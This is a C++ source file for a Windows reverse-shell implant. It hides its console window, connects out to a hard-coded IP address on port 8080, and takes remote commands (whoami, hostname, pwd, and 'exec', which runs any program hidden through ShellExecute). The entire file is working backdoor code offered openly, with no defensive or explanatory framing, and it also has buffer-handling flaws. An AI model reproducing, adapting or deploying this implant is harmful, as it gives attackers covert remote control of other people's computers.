//C++ Headers
#include <winsock2.h>
#include <windows.h>
#include <ws2tcpip.h>

//C Headers
#include <stdio.h>

// #define DEBUG 1

//Debug Headers
#ifdef DEBUG
    #include <iostream>
#endif

//Library with information for both i386 and x64 architecture of socket libraries
#pragma comment(lib, "Ws2_32.lib")

//Global variables
#define DEFAULT_BUFLEN 1024
#define RESP_BUFLEN 258


void StealthConsole();
void ReverseShell();
void ParseCmd(char* cmd, SOCKET tcpsock);

//Commands
void whoami(char* returnval, int returnsize);
void hostname(char* returnval, int returnsize);
void pwd(char* returnval, int returnsize);
void exec(char* returnval, int returnsize, char* args);

bool IfExec(char* cmd);
void SplitArgs(char* returnval, char* cmd);


int main() {
    StealthConsole();
    ReverseShell();
    return 0;
}

void StealthConsole() {
    HWND stealth;
    AllocConsole();
    stealth = FindWindowA("ConsoleWindowClass", NULL);

#ifdef DEBUG
    ShowWindow(stealth, SW_SHOWNORMAL);
#else 
    ShowWindow(stealth, SW_HIDE); 
#endif
}

void ReverseShell() {
    WSADATA wsaver;
    WSAStartup(MAKEWORD(2, 2), &wsaver);
    SOCKET tcpsock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    
    sockaddr_in addr;
    addr.sin_family = AF_INET;
    addr.sin_addr.s_addr = inet_addr("192.168.56.1"); //local subnet for debug
    addr.sin_port = htons(8080);

    if (connect(tcpsock, (SOCKADDR*)&addr, sizeof(addr)) == SOCKET_ERROR) {
        closesocket(tcpsock);
        WSACleanup();
        exit(0);
    }
    else {
#ifdef DEBUG
        std::cout << "[+] Connected to client. Waiting for incoming command...\n";
#endif
        char cmd_received[DEFAULT_BUFLEN] = "";
        while (true) {
            int result = recv(tcpsock, cmd_received, DEFAULT_BUFLEN, 0);
#ifdef DEBUG
            std::cout << "Command received: " << cmd_received;
            std::cout << "\nLength of Command received: " << result << "\n";
#endif
            ParseCmd(cmd_received, tcpsock);
            memset(cmd_received, 0, sizeof(cmd_received));
        }
    }

    closesocket(tcpsock);
    WSACleanup();
    exit(0);
}

void ParseCmd(char* cmd, SOCKET tcpsock) {
    if ((strcmp(cmd, "whoami") == 0)) {                     //whoami
#ifdef DEBUG
        std::cout << "Command parsed: whoami\n";
#endif

        char buffer[RESP_BUFLEN] = "";
        whoami(buffer, RESP_BUFLEN);
        strcat(buffer, "\n");
        send(tcpsock, buffer, strlen(buffer) + 1, 0);
    }
    else if ((strcmp(cmd, "hostname") == 0)) {              //hostname
#ifdef DEBUG
        std::cout << "Command parsed: hostname\n";
#endif

        char buffer[RESP_BUFLEN] = "";
        hostname(buffer, RESP_BUFLEN);
        strcat(buffer, "\n");
        send(tcpsock, buffer, strlen(buffer) + 1, 0);
    }
    else if ((strcmp(cmd, "pwd") == 0)) {                   //pwd
#ifdef DEBUG
        std::cout << "Command parsed: pwd\n";
#endif
        
        char buffer[MAX_PATH + 2] = "";
        pwd(buffer, MAX_PATH + 2);
        strcat(buffer, "\n");
        send(tcpsock, buffer, strlen(buffer) + 1, 0);
    }
    else if ((strcmp(cmd, "exit") == 0)) {                  //exit
#ifdef DEBUG
        std::cout << "Command parsed: exit\n";
        std::cout << "Closing connection\n";
#endif

        char buffer[10] = "Exiting\n";
        send(tcpsock, buffer, strlen(buffer) + 1, 0);

        closesocket(tcpsock);
        WSACleanup();
        exit(0);
    }
    else if (IfExec(cmd)) {                                //exec
#ifdef DEBUG
        std::cout << "Command parsed: exec\n";
#endif

        char args[DEFAULT_BUFLEN] = "";
        SplitArgs(args, cmd);

#ifdef DEBUG
        std::cout << "Arguments parsed: ";
        std::cout << args << "\n";
#endif

        char buffer[RESP_BUFLEN] = "";
        exec(buffer, RESP_BUFLEN, args);
        strcat(buffer, "\n");
        send(tcpsock, buffer, strlen(buffer) + 1, 0);
    }
    else {
#ifdef DEBUG
        std::cout << "Command not parsed!\n";
#endif

        char buffer[20] = "Invalid Command\n";
        send(tcpsock, buffer, strlen(buffer) + 1, 0);         
    }
}

void whoami(char* returnval, int returnsize) {
    DWORD bufferlen = DWORD(returnsize);
    GetUserName(returnval, &bufferlen);
}

void hostname(char* returnval, int returnsize) {
    DWORD bufferlen = DWORD(returnsize);
    GetComputerName(returnval, &bufferlen);
}

void pwd(char* returnval, int returnsize) {
    TCHAR tempvar[returnsize];
    GetCurrentDirectory(returnsize, tempvar);
    strcat(returnval, tempvar);
}

//Using ShellExecute API
void exec(char* returnval, int returnsize, char* args) {
    int result = (int)(ShellExecute(NULL, "open", args, NULL, NULL, SW_HIDE));
    if (32 >= result) {
        sprintf(returnval, "Error executing command: %d", result);
    }
    else {
        strcat(returnval, "Executed");
    }
}

bool IfExec(char* cmd) {
    char split_val[DEFAULT_BUFLEN] = ""; 
    for (int i = 0; i < DEFAULT_BUFLEN; ++i) {
        if (cmd[i] == *" ") {
            break;
        }
        else {
            split_val[i] = cmd[i];
        }
    }

    return (strcmp(split_val, "exec") == 0);
}

void SplitArgs(char* returnval, char* cmd) {
    int j = 0;
    for (int i = 5; i < DEFAULT_BUFLEN; ++i) {
        returnval[j] = cmd[i];
        ++j;
    }
}